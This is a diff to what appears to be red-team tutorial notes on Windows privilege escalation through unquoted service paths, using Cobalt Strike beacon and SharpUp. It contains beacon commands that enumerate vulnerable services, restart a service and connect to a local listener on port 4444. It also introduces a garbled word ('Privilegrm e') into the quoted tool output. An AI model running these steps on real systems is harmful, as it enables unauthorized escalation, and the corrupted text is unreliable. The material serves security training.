@@ -85,7 +85,7 @@ We can use [SharpUp](https://github.com/GhostPack/SharpUp) and Cobalt Strike exe
 ```powershell
 beacon> execute-assembly C:\Tools\SharpUp.exe audit UnquotedServicePath
 
-=== SharpUp: Running Privilege Escalation Checks ===
+=== SharpUp: Running Privilegrm e Escalation Checks ===
 
 === Services with Unquoted Paths ===
 	Service 'VulnService1' (StartMode: Automatic) has executable 'C:\Program Files\Vulnerable Services\Service 1.exe', but 'C:\Program Files\Vulnerable Services\Service' is modifable.
@@ -132,7 +132,9 @@ We'll have to stop and start the service.
 
 ```powershell
 beacon> run sc stop VulnService
-beacon> run sc start VulnService1
+beacon> run sc start VulnService
+
+beacon> connect localhost 4444
 ```
 
 ## Weak Service Permissions
